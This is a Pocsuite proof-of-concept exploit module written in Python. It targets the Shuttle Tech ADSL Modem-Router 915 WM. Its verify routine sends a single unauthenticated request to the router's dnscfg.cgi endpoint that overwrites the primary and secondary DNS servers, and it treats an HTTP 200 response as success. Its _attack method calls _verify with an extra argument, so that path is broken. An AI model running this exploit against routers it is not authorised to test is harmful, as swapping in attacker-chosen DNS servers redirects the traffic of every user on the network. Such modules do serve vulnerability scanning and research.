#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register



class TestPOC(POCBase):
    name = "Shuttle 915 WM DNS Change"
    vulID = ''
    author = ['sebao']
    vulType = 'DNS Change'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/35995/'
    desc = 'Module exploits Shuttle Tech ADSL Modem-Router 915 WM dns change vulnerability.If the target is vulnerable it is possible to change dns settings.'

    vulDate = ''
    createDate = '2017-10-26'
    updateDate = '2017-10-26'

    appName = 'Shuttle Tech ADSL Modem-Router 915 WM'
    appVersion = ''
    dork = ''
    appPowerLink = ''
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        dns1 = '8.8.8.8'
        dns2 = '8.8.4.4'
        url = self.url + "/dnscfg.cgi?dnsPrimary={}&dnsSecondary={}&dnsDynamic=0&dnsRefresh=1".format(dns1,dns2)
        resp = req.get(url)
        if resp.status_code == 200 :
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
